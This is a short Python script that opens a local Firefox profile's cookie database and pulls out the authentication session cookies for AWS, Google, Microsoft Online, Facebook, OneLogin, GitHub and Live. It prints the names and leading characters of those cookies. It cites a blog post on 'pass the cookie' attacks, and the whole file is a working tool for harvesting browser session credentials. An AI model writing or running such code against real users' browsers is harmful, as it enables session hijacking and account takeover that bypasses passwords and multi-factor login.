import sqlite3,os

profile = "jpb273b6.default-release"
firefoxPath = os.path.join( "C:\\Users\\hepos\\AppData\\Roaming\\Mozilla\\Firefox\\Profiles",profile,"cookies.sqlite")

conn = sqlite3.connect(firefoxPath)
c = conn.cursor()
c.execute("SELECT * FROM moz_cookies")

data = c.fetchall()


# Source: https://embracethered.com/blog/posts/passthecookie/
cookies = {
    ".amazon.com": ["aws-userInfo", "aws-creds"],
    ".google.com": ["OSID", "HSID", "SID", "SSID", "APISID", "SAPISID", "LSID"],
    ".microsoftonline.com": ["ESTSAUTHPERSISTENT"],
    ".facebook.com": ["c_user","cs"],
    ".onelogin.com": ["sub_session_onelogin.com"],
    ".github.com": ["user_session"],
    ".live.com": ["RPSSecAuth"],
}
for cookie in data:
    for domain in cookies:
        if cookie[4].endswith(domain) and cookie[2] in cookies[domain]:
            print("%s %s %s" % (cookie[4], cookie[2],cookie[3][:20]))